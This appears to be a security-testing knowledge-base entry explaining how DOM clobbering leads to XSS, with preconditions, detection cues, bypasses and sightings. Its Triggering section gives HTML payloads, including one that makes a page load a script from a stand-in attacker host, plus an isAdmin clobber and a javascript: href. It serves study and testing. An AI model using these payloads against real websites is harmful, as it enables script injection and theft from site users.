---
title: DOM clobbering to XSS
slug: dom-clobbering-to-xss
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/dom-clobbering, sink/innerHTML]
inbound: []
---

# DOM clobbering to XSS

## Pattern

DOM clobbering injects HTML elements with `id` or `name` attributes that shadow JavaScript global variables or properties. When code later reads those globals (e.g. `window.config`, `defaultOptions.x`) and passes the clobbered value to a dangerous sink (`innerHTML`, `eval`, `document.write`), XSS fires. The injection vector is HTML — not JS — so it can bypass JS-only sanitizers.

## Preconditions

- The application allows injection of arbitrary HTML (e.g. HTML sanitizer strips scripts but allows `<a>`, `<form>`, `<input>` elements).
- JavaScript code reads a global or property that can be clobbered by an injected element's `id`/`name`.
- The read value reaches a dangerous sink without further sanitization.

## Detection

- `js_analyzer` sink: `innerHTML`, `outerHTML`, `document.write`, `eval`
- Code reads bare globals like `window.config`, `globalThis.x`, or accesses `document.getElementById` return values as trusted data.
- HTML sanitizer output (DOMPurify etc.) allows `<a id="...">` — check if `id` values collide with JS globals.
- Look for `document.defaultView.*` or `window.*` accessed in template-rendering paths.

## Triggering

Clobber `window.config` to inject a `src`:
```html
<a id="config"><a id="config" name="transport_url" href="https://attacker.com/evil.js">
```

If the page does:
```javascript
let script = document.createElement('script');
script.src = window.config.transport_url;
document.body.appendChild(script);
```

Then the injected anchor's `name` attribute clobbers `config.transport_url`.

Classic clobbering of a single global:
```html
<img id="isAdmin" src=x>
```
If code checks `if (isAdmin)` (truthy HTMLElement) instead of strict boolean comparison.

## Bypasses

- DOMPurify < 2.0.17 allowed `<form id="...">` to clobber properties — check version.
- `<input name="...">` clobbers form properties.
- Nested clobbering via `<form id="a"><input name="b">` clobbers `a.b` (two-level).
- Attribute-based clobbering: `<a id="x" href="javascript:alert(1)">` — when `x.toString()` hits a sink.

## Seen-in-the-wild

- {date: 2023-07-06, source: CT Ep 26} -- PortSwigger Academy walk-through: two `<a>` with same id collapse to HTMLCollection, second-element `name` attribute clobbers sub-property, anchor `.toString()` returns href.
- {date: 2025-08, source: CT Ep 149} — DEFCON 33 Jack-fromeast et al. shipped automated framework "Hulk" + GitHub `dom-clobbering-collection`: AST taint-analysis derives the HTML payload that satisfies the prototype-shape needed to reach the sink. ~500 zero-days across webpack/rspack/vite/google-api-client-library/astro runtime code.

## References

- [PortSwigger DOM-based vulnerabilities](../../sources/portswigger-dom-based.md) — DOM clobbering section
- [DOM XSS SUMMARY](SUMMARY.md)
